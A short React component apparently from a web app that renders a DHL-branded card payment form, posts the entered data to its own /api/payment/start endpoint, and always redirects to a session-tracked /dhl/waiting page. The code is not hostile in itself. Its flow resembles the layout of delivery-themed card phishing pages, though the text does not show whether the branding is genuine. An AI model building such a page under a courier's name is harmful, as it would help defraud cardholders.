import { useMutation } from "@tanstack/react-query";
import DHLPaymentForm, { type PaymentFormData } from "@/components/DHLPaymentForm";
import { apiRequest } from "@/lib/queryClient";

export default function CardPage() {
  const startPaymentMutation = useMutation({
    mutationFn: async (data: PaymentFormData) => {
      const response = await apiRequest("POST", "/api/payment/start", data);
      const result = await response.json();
      return result as { paymentId: string; sessionId: string };
    },
    onSuccess: (data) => {
      localStorage.setItem("dhlPaymentId", data.paymentId);
      // Always redirect to waiting/loading page
      window.location.href = `/dhl/waiting?session=${data.sessionId}&paymentId=${data.paymentId}`;
    },
  });

  const handlePaymentSubmit = (data: PaymentFormData) => {
    startPaymentMutation.mutate(data);
  };

  return <DHLPaymentForm onSubmit={handlePaymentSubmit} />;
}
